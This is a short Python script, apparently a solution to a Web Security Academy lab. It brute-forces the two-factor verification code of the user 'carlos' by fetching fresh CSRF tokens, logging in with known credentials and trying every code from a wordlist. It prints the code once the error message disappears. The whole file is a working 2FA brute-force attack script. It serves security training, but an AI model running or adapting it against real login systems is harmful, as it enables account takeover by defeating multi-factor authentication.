import requests
import re
from bs4 import BeautifulSoup

wordlist = open("wordlist1.txt","r")

for i in wordlist:
	respuesta1 = requests.get("https://0a83002f03e5f12f83b378d800f20065.web-security-academy.net/login")
	soup = BeautifulSoup(respuesta1.text, 'html.parser')
	csrf_field = soup.find('input', {'name': 'csrf'})
	csrf_value = csrf_field.get('value')
	cookies1 = respuesta1.cookies

	data = {"csrf": csrf_value, "username": "carlos", 'password': "montoya"}
	respuesta2 = requests.post('https://0a83002f03e5f12f83b378d800f20065.web-security-academy.net/login', data=data, cookies=cookies1, allow_redirects=False)
	cookies2 = respuesta2.cookies

	respuesta3 = requests.get('https://0a83002f03e5f12f83b378d800f20065.web-security-academy.net/login2', cookies=cookies2)
	soup1 = BeautifulSoup(respuesta3.text, 'html.parser')
	csrf_field1 = soup1.find('input', {'name': 'csrf'})
	csrf_value1 = csrf_field1.get('value')

	data1 = {"csrf": csrf_value1, "mfa-code": i.strip()}
	respuesta4 = requests.post('https://0a83002f03e5f12f83b378d800f20065.web-security-academy.net/login2', data=data1, cookies=cookies2)
	coincidencia = re.findall("Incorrect security code", respuesta4.text)	
	if coincidencia == []:
		print("El codigo de verificacion de Carlos es: "+i)
		quit()
